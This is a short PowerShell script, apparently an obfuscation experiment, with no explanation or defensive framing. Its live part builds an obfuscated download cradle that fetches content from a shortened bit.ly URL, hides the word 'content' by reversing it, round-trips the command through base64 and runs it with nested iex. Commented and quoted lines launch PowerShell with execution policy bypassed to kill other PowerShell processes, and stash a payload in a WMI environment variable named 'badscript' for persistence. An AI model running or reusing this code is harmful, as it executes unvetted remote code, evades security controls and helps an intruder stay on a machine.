$Text = [Text.encoding]::UTF8.GetBytes('$($c = "tnetnoc".ToCharArray();iwr "https://bit.ly/2L3Fjn4").$([array]::Reverse($c);$c  -join($_))')
#$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
#JCgkYyA9ICJ0bmV0bm9jIi5Ub0NoYXJBcnJheSgpO2l3ciAiaHR0cHM6Ly9iaXQubHkvMkwzRmpuNCIpLiQoW2FycmF5XTo6UmV2ZXJzZSgkYyk7JGMgIC1qb2luKCRfKSk=
$WriteHost =[Convert]::ToBase64String($Text) #-replace("A",'z')
$WriteHost = [Convert]::FromBase64String($WriteHost)
$WriteHost = [System.Text.Encoding]::UTF8.GetString($WriteHost)

iex "iex $WriteHost"

#try { asdfasdf }
#catch { throw [System.IO.FileNotFoundException]::new("$(iex 'start-process powershell.exe -ArgumentList `"-executionpolicy bypass -noexit -command `""gps -name *power* |?{`$_.id -ne `$PID} | stop-process -force`""`"') ")}


'start-process powershell.exe -ArgumentList "-executionpolicy bypass -noexit -command ""gps -name *power* |?{`$_.id -ne `$PID} | stop-process -force"""'


#Set-WmiInstance -Class win32_environment -Arguments @{Name="badscript";variablevalue=$WriteHost;username="<SYSTEM>"}
#gwmi win32_environment | ? {$_.name -eq "badscript"} | select -expa variablevalue
